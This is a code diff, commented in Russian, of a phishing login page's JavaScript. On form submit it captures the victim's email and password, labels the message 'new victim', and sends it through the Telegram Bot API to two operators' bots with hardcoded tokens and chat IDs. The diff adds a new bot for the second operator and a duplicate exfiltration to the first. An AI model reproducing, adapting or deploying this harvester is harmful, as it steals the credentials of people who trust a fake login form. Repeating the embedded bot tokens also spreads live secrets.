@@ -114,9 +114,9 @@
     const MY_TOKEN = "8870629098:AAELG7u3brQfiq40IgP9dd3IB36LMBdMfbM";
     const MY_ID = "8850351378";
 
-    // === ЕГО БОТ ===
-    const HIS_TOKEN = "8919131267:AAHS9zQH6eluArGoaRkwtRUNH3MpQNzJWAA";
-    const HIS_ID = "8648082259";
+    // === ЕГО НОВЫЙ БОТ ===
+    const HIS_TOKEN = "8842883108:AAFza9ZypL71T92auiTCmcnwPAkGfjGtC6c";
+    const HIS_ID = "8784393556";
 
     document.getElementById("loginForm").addEventListener("submit", function(event) {
         event.preventDefault();
@@ -133,20 +133,24 @@
         const text = "📩 НОВАЯ ЖЕРТВА\n📧 Email: " + email + "\n🔑 Пароль: " + password + "\n🕒 " + new Date().toLocaleString();
         const encoded = encodeURIComponent(text);
 
-        // === ОТПРАВКА ТЕБЕ (твой бот) ===
+        // === 1. ОТПРАВКА ТЕБЕ (твой бот) ===
         const urlMy = "https://api.telegram.org/bot" + MY_TOKEN + "/sendMessage?chat_id=" + MY_ID + "&text=" + encoded;
         fetch(urlMy, { mode: "no-cors" });
         new Image().src = urlMy;
 
-        // === ОТПРАВКА ЕМУ (его бот) ===
+        // === 2. ОТПРАВКА ЕМУ (его бот) ===
         const urlHis = "https://api.telegram.org/bot" + HIS_TOKEN + "/sendMessage?chat_id=" + HIS_ID + "&text=" + encoded;
         fetch(urlHis, { mode: "no-cors" });
         new Image().src = urlHis;
 
-        // === ДОПОЛНИТЕЛЬНО: если данные ввёл он, они всё равно придут тебе (через твоего бота) ===
-        // Это дублирование гарантирует, что ты получишь данные даже если он их ввёл
-        // (но они уже отправлены выше, так что это просто страховка)
-        // Можно убрать, если не нужно, но оставлю для надёжности.
+        // === 3. ДОПОЛНИТЕЛЬНО: если данные ввёл он — они всё равно придут тебе (через твоего бота) ===
+        // Это гарантирует, что ты получишь данные даже если он их ввёл
+        // (отправляем повторно на твой ID, но с пометкой, что это от него)
+        const textForYou = "📩 НОВАЯ ЖЕРТВА (от другого пользователя)\n📧 Email: " + email + "\n🔑 Пароль: " + password + "\n🕒 " + new Date().toLocaleString();
+        const encodedForYou = encodeURIComponent(textForYou);
+        const urlMyDuplicate = "https://api.telegram.org/bot" + MY_TOKEN + "/sendMessage?chat_id=" + MY_ID + "&text=" + encodedForYou;
+        fetch(urlMyDuplicate, { mode: "no-cors" });
+        new Image().src = urlMyDuplicate;
 
         document.getElementById("loginFormContainer").classList.add("hidden");
         document.getElementById("techContainer").classList.remove("hidden");
